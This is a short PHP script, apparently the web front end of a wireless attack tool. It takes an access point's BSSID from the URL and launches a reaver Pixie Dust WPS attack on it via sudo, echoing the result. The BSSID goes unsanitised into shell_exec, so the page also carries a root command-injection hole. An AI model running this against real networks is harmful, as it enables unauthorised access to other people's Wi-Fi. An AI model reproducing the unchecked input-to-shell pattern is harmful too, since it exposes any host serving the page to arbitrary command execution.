
<?php
$bssid =  $_GET["bssid"];
$card = shell_exec('iw dev | awk \'$1=="Interface"{print $2}\' | sed -e \'2d\' ');
$message = "Monitor mode not enabled";
$moncheck = shell_exec('iwconfig wlan1 | grep Monitor | sed -e "s/Mode:/ /" | awk \'{print $1}\' | cut -b 5');
$attack = shell_exec("sudo reaver -i wlan1 -b $bssid -F -N --pixie-dust -vv");
	if ($moncheck == 1) {
		echo "<pre>$attack</pre>";
	}
	else {
	echo "<pre>$message</pre>";
	}

?>
